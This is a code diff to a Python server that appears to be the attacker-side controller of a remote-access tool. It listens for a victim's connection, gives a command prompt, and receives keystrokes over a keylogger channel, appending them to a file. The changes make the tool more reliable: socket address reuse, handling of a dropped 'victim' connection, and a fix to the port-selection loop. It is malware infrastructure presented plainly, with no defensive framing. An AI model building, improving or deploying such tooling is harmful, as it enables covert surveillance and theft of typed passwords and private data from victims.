@@ -31,6 +31,7 @@ class Server:
              print(f"[*]Listening on {self.ip}:{self.port}")
           prompt = ">".rstrip("\n")
           with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
+               sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.bind((self.ip,self.port))
                sock.listen(2)
                tgt_sock, addr = sock.accept()
@@ -60,6 +61,9 @@ class Server:
                   except BrokenPipeError:
                          print("User entered \"break\" command, connection closed.\nIf you did not enter the break command then an unknown error has occured")
                          break
+                  except ConnectionResetError:
+                         print("[-] Victim terminated connection")
+                         break
                   
           threading.Thread(target=self.active_connection,kwargs={"verbose":self.__FLAG}).start()
     
@@ -77,18 +81,22 @@ class Server:
            print(f"[*]Keystrokes file path -> {colored(path,'green')}")
            
         with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as ksock:
+             ksock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
              ksock.bind((self.ip,self.port))
              ksock.listen(2)
              tgt_ksock, addr = ksock.accept()
              print(f"\n[*]Got a connection from {addr[0]}:{addr[1]}")
-             
              while True:
-                     keystrokes = tgt_ksock.recv(1024).decode()
-                     if not keystrokes:
-                        break
-                     
-                     with open(path, "a") as f:
-                            f.write(keystrokes)
+                  try:
+                       keystrokes = tgt_ksock.recv(1024).decode()
+                       if not keystrokes:
+                          break
+                       
+                       with open(path, "a") as f:
+                              f.write(keystrokes)
+                  except ConnectionResetError:
+                       print("[-] Victim terminated connection")
+                       break
         
         threading.Thread(target=self.keylog_connection,args=(path,),kwargs={"verbose":self.__FLAG}).start()
        
@@ -105,6 +113,7 @@ class Server:
         
         while True:
            with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s_sock:
+                 s_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                  s_sock.bind((self.ip,self.port))
                  s_sock.listen(2)
                  tgt_s_sock, addr = s_sock.accept()
@@ -149,6 +158,7 @@ def main()->None:
             if int(MAIN_PORT >1000) and int(MAIN_PORT) < 2**16:
                KLOG_PORT = MAIN_PORT+1
                BIN_PORT = MAIN_PORT+2  
+               break
       
         except ValueError :
             sys.stderr.write(f"Port number must be of base 10 and between 1000 and {2**16}\n")
